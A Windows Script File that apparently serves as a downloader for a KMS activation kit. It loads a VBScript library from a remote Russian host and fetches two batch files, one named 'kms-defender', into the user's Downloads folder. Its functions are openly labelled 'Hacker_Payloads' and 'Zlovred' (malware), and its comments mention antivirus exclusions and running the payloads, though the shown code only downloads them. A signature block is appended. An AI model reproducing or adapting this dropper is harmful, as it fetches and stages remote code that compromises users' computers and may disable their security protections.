<?xml version="1.0" encoding="Windows-1251"?>
<!-- ***************************** -->
<!-- File wsf -->
<!-- Dn.KMS.scripts.wsf -->
<!--
This Script Downloads Batch File to
Temporary Directory 
-->
<!-- ***************************** -->
<job id="ID1">
	<script language="VBScript" src="http://file.netip4.ru/PROGS/LIB-WSH/LIB-VBS/lib_finc-1.2.0.vbs"></script>
	<script language="JScript">
	<![CDATA[
/*******************************************************
 * MakeZlovred()
 * Make Zlovred Directory
 * This Script will Make Up a Zlovred Directory
 *
*******************************************************/
function MakeZlovred(){

	// Define a Variables
	var fso, pub1_folder, pubdistrib_folder, pubzlovred_folder;
	var error_string, succes_string;

	error_string = "\nError! Can\'t Create the folder.\n";
	succes_string = "\nSuccess Folder Create.\n";

	// Create File System Object
	fso = new ActiveXObject("Scripting.FileSystemObject");

	// Define Folders
	pub1_folder = "C:\\pub1";
	pubdistrib_folder = pub1_folder + "\\" + "Distrib";
	pubzlovred_folder = pubdistrib_folder + "\\" + "Zlovred";

	// Run a Payload
	if( !fso.FolderExists(pub1_folder)) {
		try {
			fso.CreateFolder(pub1_folder);
		} catch (err){
			error_string +="Folder: " + pub1_folder + ", err: " + err.message +"\n";
			// // WScript.Echo(error_string);
			return 1;
		}
	}
	if( !fso.FolderExists(pubdistrib_folder)) {
		try {
			fso.CreateFolder(pubdistrib_folder);
		} catch (err){
			error_string +="Folder: " + pubdistrib_folder + ", err: " + err.message +"\n";
			// // WScript.Echo(error_string);
			return 1;
		}
	}
	if( !fso.FolderExists(pubzlovred_folder)) {
		try {
			fso.CreateFolder(pubzlovred_folder);
		} catch (err){
			error_string +="Folder: " + pubzlovred_folder + ", err: " + err.message +"\n";
			// // WScript.Echo(error_string);
			return 1;
		}
	}
	// // WScript.Echo(succes_string);
	return 0;
}
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[

' *********************************************************
'
' getDownlEnviron03()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Download Directory if Exists or
' 				Path for User Profile Directory if exist or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
Function getDownlEnviron03()
	Dim fso, wsh, envProc, envSys, pathTemp
	Dim strZlFolder ' Download Temprorary Folder
	' Downloads Folder Registry Key
	Dim GUID_WIN_DOWNLOADS_FOLDER
	Dim KEY_PATH
	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}"
	KEY_PATH = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
	Dim aKey 
	aKey = KEY_PATH & GUID_WIN_DOWNLOADS_FOLDER
	'
	' Define ActiveX Objects
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	' Define Process Environment Variable
	Set envProc = wsh.Environment("PROCESS")
	' Define System Environment Variable
	Set envSys = wsh.Environment
	' Define Download Temprorary Folder

	On Error Resume Next
	pathTemp = RegKeyRead001(aKey)
	On Error Goto 0

	' WScript.Echo pathTemp
	If InStr(1, pathTemp, "%USERPROFILE%", vbTextCompare ) Then 
		pathTemp = Replace(pathTemp, "%USERPROFILE%", envProc("USERPROFILE"))
	End If

	' Define and Check Environment Variables
	Dim envVariable
	envVariable = pathTemp
	If Not fso.FolderExists(envVariable) Then
		envVariable = envProc("USERPROFILE")
		If Not fso.FolderExists(envVariable) Then
			envVariable = getTempEnviron01()
			IF Not fso.FolderExists(envVariable) Then
				envVariable = ""
			End If
		End If
	End If
	getDownlEnviron03 = envVariable
End Function

' *********************************************************
'
' UploadFilesFromIntWithHTTP01( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- if XMLHTTP or ADOStream Can't Initialize
'				3 -- if Emty HTTP Responce or Send Access Denied
'				4 -- if HTTP Response Not 200 (while is not make)
'
' *********************************************************/
Function UploadFilesFromIntWithHTTP01(strFile, strURL, strPath)
	' body...
	On Error Resume Next
	Err.Clear
	Dim fso, xmlHttp, adoStream
	Dim cb0, cb1, cb2, cb3
	' Define FileSystemObject
	Set fso = CreateObject("Scripting.FileSystemObject")
	If Err.Number <> 0 Then
		UploadFilesFromIntWithHTTP01 = 1
	Else
		Err.Clear
		' Define XMLHTTP Help Object
		' Set xmlHttp = getXmlHttp02
		Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
		If IsNull(xmlHttp) Then
			UploadFilesFromIntWithHTTP01 = 2
		Else
			' Define Adodb.Stream Object
			Set adoStream = CreateObject("Adodb.Stream")
			if Err.Number <> 0 Then
				UploadFilesFromIntWithHTTP01 = 2
			else
				Err.Clear
				Dim strFileURL
				Dim strLocal_Path
				Dim intUploadFilesFromIntWithHTTP01
				Dim blnExistRemoteFile
				Dim cb(4)
				' Define Full Downloaded File URL
				strFileURL = strURL & strFile
				' Define Full Local Path to be Downloaded
				strLocal_Path = strPath & "\" & strFile
				intUploadFilesFromIntWithHTTP01 = 0
				' Check if Path is Exist
				if fso.FolderExists(strPath) Then
					intUploadFilesFromIntWithHTTP01 = 0
				else
					intUploadFilesFromIntWithHTTP01 = 1
				end if
				If fso.FileExist(strLocal_Path) Then
					fso.DeleteFile strLocal_Path, true
				End If
				' WScript.Echo "int = " & intUploadFilesFromIntWithHTTP01

				' Downloaded File
				' Open URL (Get Requiest synchronous)
				Err.Clear
				xmlHttp.Open "GET", strFileURL, false
				If Err.Number <> 0 Then
					WScript.Echo "Can't Open URL: " & strFileURL & vbNewLine & "Error: " & Str(Err.Number)
					UploadFilesFromIntWithHTTP01 = 3
				Else
					Err.Clear
					' Set User-Agent Header (for Safari Browser)
					' WScript.Echo "Test!"
					xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
					' Define Function onreadystatechange
					'xmlHttp.onreadystatechange = GetRef("xmlHTTP_OnReadyStateChange")
					'if(xmlHttp.readyState === 4) {
					'	cb[0] = xmlHttp.status; // Status of Request (Integer Number)
					'	cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
					'	cb[2] = xmlHttp.responseText; // Response Text
					'	cb[3] = xmlHttp.responseBody; // Response Body
					'}

					' Send File from URL

					xmlHttp.Send
					' /*** Test ***/
					' Wscript.Echo "Download-Status: " & xmlhttp.Status & " " & xmlhttp.statusText
						'xmlHttp.WaitForResponse
						'WScript.Echo "Can't make Send() Request!" & vbNewLine & "May be Block with Antivirus?" & vbNewLine & "Err = " & Str(Err.Number)
						'UploadFilesFromIntWithHTTP01 = 3
						'xmlHttp.Abort
						Err.Clear
						
						cb0 = xmlHttp.Status
						cb1 = xmlHttp.getAllResponseHeaders
						cb2 = xmlHttp.responseText
						cb3 = xmlHttp.responseBody
						If cb0 = 200 And intUploadFilesFromIntWithHTTP01 = 0 Then
							' WScript.Echo "XmlHttp Status = " & cb0 & vbNewLine
							' If Send Request is Successful
							blnExistRemoteFile = true
						Else
							blnExistRemoteFile = false
							intUploadFilesFromIntWithHTTP01 = 4
							WScript.Echo "Wrong HTTP Status:" & cb0 & vbNewLine & "nURL = " & strFileURL
							xmlHttp.Abort
						End If
						If blnExistRemoteFile = true Then
							' Set AdoStream Type mode and Open It
							adoStream.Type = 1
							adoStream.Mode = 3
							adoStream.Open
							' Write to AdoStream Response Body of HTTP Request
							Err.Clear
							adoStream.Write(cb3)
							If Err.Number <> 0 Then
								WScript.Echo "Can't Save Data to the Stream." & vbNewLine & "Error Status: " & Err.Number & vbNewLine
							End If
							' WScript.Echo "The Local File Path = " & strLocal_Path & vbNewLine
							' Save Stream to strFile
							Err.Clear ' Must be Heare!
							adoStream.SaveToFile strLocal_Path, 2
							If Err.Number <> 0 Then
								WScript.Echo "Can't Save File Stream into File: " & strLocal_Path & vbNewLine & "Check Access Rights!" & vbNewLine &_ 
									"Error Status: " & Err.Number & ". The Error " & Err.Description & " has occurred." & vbNewLine
								intUploadFilesFromIntWithHTTP01 = 1
							Else
								' /Downloaded File
								' Close Objects
								adoStream.Close
								xmlHttp.Abort
								' Check If File Downloaded
								If Not fso.FileExists(strLocal_Path) And intUploadFilesFromIntWithHTTP01 = 0 Then
									Wscript.Echo strLocal_Path & " is not found!"
									intUploadFilesFromIntWithHTTP01 = 1
								End If
							End If
						End If
				End If
				UploadFilesFromIntWithHTTP01 = intUploadFilesFromIntWithHTTP01
				' WScript.Echo strLocal_Path
			end if
		End If
	End If
End Function

	]]>
	</script>
	<script language="JScript">
	<![CDATA[
/**********************************************************
' * Function Download_Payload()
' * This Function will Download TinyExclusions Files
' * at a User's Downloads Directory
' *
' * PARAMETERS: downloadDir
' * RETURNS:	0 if Success Downloads all Files
' *				1 if Error Downloads Occur
' ********************************************************/
function Download_Payload( downloadDir ) {

	// Define a Metadata Variables
	var product_name, firm_name;

	// Set a Metadata
	product_name = "KMS";
	firm_name = "NIT";
	
	// Define a Host Variables
	var http_pref, http_domain, http_port, http_dir, host;
	http_pref = "http";
	http_domain = "distrib.netip6.ru";
	http_port = "80";
	http_dir = "/" + firm_name + "/" + product_name + "/";
	host = http_pref + "://" + http_domain + ":" + http_port + http_dir;

	// Define Directories and Files Variables
	var kmsdefender_file, kmsprogram_file
	kmsdefender_file = "kms-defender.scripts.download.cmd";
	kmsprogram_file = "kms-program.scripts.download.cmd";

	// Define Auxiliary Variables
	var iRes, error_message, success_message, strFile;
	error_message = "\nError! Canot Download a File.\n";
	success_message = "\nSuccess File Download.\n";

	// Run a Payload
	strFile = kmsdefender_file;
	iRes = UploadFilesFromIntWithHTTP01(strFile, host, downloadDir);
	if( iRes > 0) {
		error_message += "host = " + host + ", file = " + strFile +"\n";
		WScript.Echo(error_message);
		return 1;
	}
	else {
		success_message += "host = " + host + ", file = " + strFile +"\n";
		// WScript.Echo(success_message);
	}

	strFile = kmsprogram_file;
	iRes = UploadFilesFromIntWithHTTP01(strFile, host, downloadDir);
	if( iRes > 0) {
		error_message += "host = " + host + ", file = " + strFile +"\n";
		WScript.Echo(error_message);
		return 1;
	}
	else {
		success_message += "host = " + host + ", file = " + strFile +"\n";
		// WScript.Echo(success_message);
	}

	return 0;
}

/**********************************************************
 * Delete_Payloads
 * This Script will Delete Hacker's Payloads
' *
' * PARAMETERS: downloadDir
' * RETURNS:	0 if Delete all Files
' *				1 if Delete Error Occur
**********************************************************/
function Delete_Payloads(downloadDir) {

	// Define a Metadata Variables
	var product_name, firm_name;

	// Set a Metadata
	product_name = "KMS";
	firm_name = "NIT";
	
	// Define Directories and Files Variables
	var kmsdefender_file, kmsprogram_file
	kmsdefender_file = "kms-defender.scripts.download.cmd";
	kmsprogram_file = "kms-program.scripts.download.cmd";

	// Define Auxiliary Variables
	var iRes, fso;
	fso = new ActiveXObject("Scripting.FileSystemObject");

	// Run Payloads
	strFile = kmsdefender_file;
	strPath = downloadDir + "\\" + strFile;
	if(fso.FileExists(strPath)) {
		try {
			fso.DeleteFile(strPath, true);
		}
		catch(err) {
			WScript.Echo("\nError Deleting File: " + strPath + ".\nError = " + err.message + "\n");
		}
	}

	strFile = kmsprogram_file;
	strPath = downloadDir + "\\" + strFile;
	if(fso.FileExists(strPath)) {
		try {
			fso.DeleteFile(strPath, true);
		}
		catch(err) {
			WScript.Echo("\nError Deleting File: " + strPath + ".\nError = " + err.message + "\n");
		}
	}

	// WScript.Echo("\nAll Files had Tried to Delete!\n");
	return 0;

}


/**********************************************************
 * Hacker_Payloads
 * This Script will Download and Execute Hacker's Payloads
 *
 * PARAMETERS:	NONE
 * RETURNS:		0 if Succes Run Payloads
 *				1 if Download Directory is not Found or Files Does Not Exist
 *				2 if File Download Error
**********************************************************/
function Hacker_Payloads() {

	// Define a Metadata Variables
	var product_name, firm_name;

	// Set a Metadata
	product_name = "KMS";
	firm_name = "NIT";
	
	// Define Directories and Files Variables
	var downloadDir, fso;
	fso = new ActiveXObject("Scripting.FileSystemObject");
	downloadDir = getDownlEnviron03();
	if( downloadDir.length == 0) {
		WScript.Echo("\nError! Download Directory is not Found!\n");
		return 1;
	}
	
	// Define Auxiliary Variables
	var iRes;

	iRes = Delete_Payloads(downloadDir);

	// Run Payloads
	iRes = Download_Payload(downloadDir);
	if( iRes > 0 ) {
		iRes = Delete_Payloads(downloadDir);
		return 2;
	}

	return 0;
}
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
		Dim iRes
		iRes = Hacker_Payloads()
		if iRes = 2 Then
			WScript.Echo vbNewLine & "Error at Downloading Files."
		Elseif iRes = 1 Then
			 WScript.Echo vbNewLine & "Permission Denied at Creating Files or Folders."
		Elseif iRes = 0 Then
		'	 WScript.Echo vbNewLine & "Succes Files Download and Run"
		Else
			 WScript.Echo vbNewLine & "Unknown Error Occur"
		End If
		WScript.Quit iRes
	]]>
	</script>

<signature>
** SIG ** MIIJcwYJKoZIhvcNAQcCoIIJZDCCCWACAQExCzAJBgUr
** SIG ** DgMCGgUAMGcGCisGAQQBgjcCAQSgWTBXMDIGCisGAQQB
** SIG ** gjcCAR4wJAIBAQQQcAVhGs441BGiowAQS9NQkAIBAAIB
** SIG ** AAIBAAIBAAIBADAhMAkGBSsOAwIaBQAEFJ1gd5a5K9Fp
** SIG ** 8sOp/ZEoN6cu5Vh1oIIHEjCCAzUwggKioAMCAQICEJkW
** SIG ** fLCelp6QTP4DmBoxgmYwCQYFKw4DAh0FADCBnzEjMCEG
** SIG ** A1UEAxMaTklUIENsYXNzIDMgRVYgU1NMIENBIC0gRzQx
** SIG ** MDAuBgNVBAsTJ05ldyBJbnRlcm5ldCBUZWNobm9sb2dp
** SIG ** ZXMgVHJ1c3QgTmV0d29yazEnMCUGA1UEChMeTmV3IElu
** SIG ** dGVybmV0IFRlY2hub2xvZ2llcyBJbmMuMRAwDgYDVQQH
** SIG ** EwdTYXJhdG92MQswCQYDVQQGEwJSVTAgFw0yMDA3MjAw
** SIG ** NjI4NDdaGA8yMTIwMDcyMDA2Mjg0NlowKTEnMCUGA1UE
** SIG ** AxMeTmV3IEludGVybmV0IFRlY2hub2xvZ2llcyBJbmMu
** SIG ** MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDQ1J5P
** SIG ** MxpU8hfBgsQdWlC7jaSI6gyoOXU9lIzlq8Th4EImJa6h
** SIG ** IwtRj1AsI7EtNToFY79mfbpGpwj5vOJuL4cOQCN6AH1k
** SIG ** FQ1dsvPFcInMaskHQbI4bbo2SdkssPEYBHpRnxmluCpA
** SIG ** n33Q2omE4fDqNkP/YTOJBmq97r4K8WIAcQIDAQABo4Hs
** SIG ** MIHpMA8GA1UdEwEB/wQFMAMCAQUwIAYDVR0EAQH/BBYw
** SIG ** FDAOMAwGCisGAQQBgjcCARYDAgeAMDAGCisGAQQBgjcC
** SIG ** AQoEIjAgoB6AHGh0dHA6Ly9hbnRpY3JpbWluYWxvbmxp
** SIG ** bmUucnUwHQYDVR0lBBYwFAYIKwYBBQUHAwMGCCqFAwUB
** SIG ** GAIPMGMGA1UdAQRcMFqAEGft9iXxljpcUsmwg9jyG2mh
** SIG ** NDAyMTAwLgYDVQQDEydWZXJpU2lnbiBDbGFzcyAzIENv
** SIG ** ZGUgU2lnbmluZyAyMDIwLTIgQ0GCEIgt5Q0CI8WGSSAx
** SIG ** xykMZP4wCQYFKw4DAh0FAAOBgQCl/jyH83QyUErLnc0o
** SIG ** 0/8gWzEvxlY64xmNe+rEE7B243/YIDUCGZBIOKSgcpzo
** SIG ** 9tMCgY1aG0FuMIBsb+VL4C/17ITyhOfMAy9fvQ9bXhBL
** SIG ** WJ7XZ/M+1s2QtkZu+5mVfsnfmWm1F4vWJu1Xs5h31q53
** SIG ** nR9j9BjbiBKR+ppGFDlAQzCCA9UwggLBoAMCAQICEIgt
** SIG ** 5Q0CI8WGSSAxxykMZP4wCQYFKw4DAh0FADAyMTAwLgYD
** SIG ** VQQDEydWZXJpU2lnbiBDbGFzcyAzIENvZGUgU2lnbmlu
** SIG ** ZyAyMDIwLTIgQ0EwIBcNMjAwNzIwMDYyNzM1WhgPMjEy
** SIG ** MDA3MjAwNjI3MzRaMIGfMSMwIQYDVQQDExpOSVQgQ2xh
** SIG ** c3MgMyBFViBTU0wgQ0EgLSBHNDEwMC4GA1UECxMnTmV3
** SIG ** IEludGVybmV0IFRlY2hub2xvZ2llcyBUcnVzdCBOZXR3
** SIG ** b3JrMScwJQYDVQQKEx5OZXcgSW50ZXJuZXQgVGVjaG5v
** SIG ** bG9naWVzIEluYy4xEDAOBgNVBAcTB1NhcmF0b3YxCzAJ
** SIG ** BgNVBAYTAlJVMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCB
** SIG ** iQKBgQCnV+ciVLV8TSoMuck7HvoRB4lrtVYL0aVgIrqH
** SIG ** ktNwNyHe7sFP9Xr111Eg5Jdvdw5CffEw1DpdrTknvSug
** SIG ** sh+thGtJEWgFpaGjusB+tIYx9SyDkdF7vL/4I/6k10BE
** SIG ** obWbe9iOMzCwuu7v8p3MuWbZ05Cn5YxGLLDpoiSKogMe
** SIG ** HQIDAQABo4IBATCB/jASBgNVHRMBAf8ECDAGAQH/AgEF
** SIG ** MCAGA1UdBAEB/wQWMBQwDjAMBgorBgEEAYI3AgEWAwIH
** SIG ** gDAwBgorBgEEAYI3AgEKBCIwIKAegBxodHRwOi8vYW50
** SIG ** aWNyaW1pbmFsb25saW5lLnJ1MDsGA1UdJQQ0MDIGCCsG
** SIG ** AQUFBwMBBggrBgEFBQcDAgYIKwYBBQUHAwMGCCsGAQUF
** SIG ** BwMEBggqhQMFARgCDzBXBgNVHQEEUDBOgBB4leuhVGrS
** SIG ** yZlKiPAsnoXwoTQwMjEwMC4GA1UEAxMnVmVyaVNpZ24g
** SIG ** Q2xhc3MgMyBDb2RlIFNpZ25pbmcgMjAyMC0yIENBggSy
** SIG ** LhlFMAkGBSsOAwIdBQADggEBAAHNhrK52O5Yaon4AcVr
** SIG ** ygKPdPQINAhPi4Y6iDb8PnXdZKxJloMhgLAhr2FGCObe
** SIG ** WkP/usGDEHOYVd2s/nO3+/c+GasvhwZRTBdHMAe5Eosi
** SIG ** eSy/b7DeJK15LtRi1m7VCDYHGBgZM2RA85thdIRo8SCx
** SIG ** +rg+7JGd6RCMSYpyXs5kmc/XZL5BjERrste009TJuI/o
** SIG ** IEa0VpNuPmyydkPcxSUyHaMXieos+xus/u4O9fMe66ZX
** SIG ** GDGWhno79a0/LXutmRxz7yCmnpGevSV9jpvLhXI1AIMw
** SIG ** TtOkUegE5t1uF90FF4suoXzh2VFb0o0ENF8WJ8mEvyDm
** SIG ** iVLQH+pY/mZ2OX8xggHNMIIByQIBATCBtDCBnzEjMCEG
** SIG ** A1UEAxMaTklUIENsYXNzIDMgRVYgU1NMIENBIC0gRzQx
** SIG ** MDAuBgNVBAsTJ05ldyBJbnRlcm5ldCBUZWNobm9sb2dp
** SIG ** ZXMgVHJ1c3QgTmV0d29yazEnMCUGA1UEChMeTmV3IElu
** SIG ** dGVybmV0IFRlY2hub2xvZ2llcyBJbmMuMRAwDgYDVQQH
** SIG ** EwdTYXJhdG92MQswCQYDVQQGEwJSVQIQmRZ8sJ6WnpBM
** SIG ** /gOYGjGCZjAJBgUrDgMCGgUAoHAwEAYKKwYBBAGCNwIB
** SIG ** DDECMAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQw
** SIG ** HAYKKwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARYwIwYJ
** SIG ** KoZIhvcNAQkEMRYEFAa2RQtwETohgydz/jYvC4mCk8C9
** SIG ** MA0GCSqGSIb3DQEBAQUABIGAbukMcW516v7enJPRnPQJ
** SIG ** OPL1ynztPXDnncIF6oQWTPA6c2hFrwLHOv22Cr0WVzWe
** SIG ** cVTDISwjcnuZCkS+k58/0XaqzoJcyREho3pBDxfNaGRS
** SIG ** z1tk22i7F4WrWk4gTg8upCIA8Ir84BA6bi3teFUiEEW5
** SIG ** xmQrCLIessCSy3nhY08=
</signature>
</job>
